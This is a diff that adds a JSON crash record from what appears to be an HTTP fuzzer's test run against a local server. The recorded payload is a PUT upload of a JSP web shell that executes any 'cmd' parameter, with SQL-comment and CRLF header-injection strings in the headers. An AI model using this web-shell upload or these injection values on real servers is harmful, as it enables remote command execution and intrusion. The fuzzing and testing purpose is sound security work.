@@ -1,0 +1,24 @@
+{
+  "timestamp": "2025-12-29T14:42:23.561371",
+  "crash_type": "server_crash",
+  "payload": "PUT /shell.jsp?\nHeaders: {'User-Agent': 'curl/7.68.0', 'Accept-Encoding': \"admin'--\", 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Forwarded-For': '4294967295', 'Authorization': '%0d%0aSet-Cookie: evil=true', 'Content-Range': 'bytes 0-100/101', 'Content-Length': '59'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "aa8e7908193ba777",
+  "request_method": "PUT",
+  "request_path": "/shell.jsp?",
+  "request_headers": {
+    "User-Agent": "curl/7.68.0",
+    "Accept-Encoding": "admin'--",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Forwarded-For": "4294967295",
+    "Authorization": "%0d%0aSet-Cookie: evil=true",
+    "Content-Range": "bytes 0-100/101",
+    "Content-Length": "59"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 778
+}
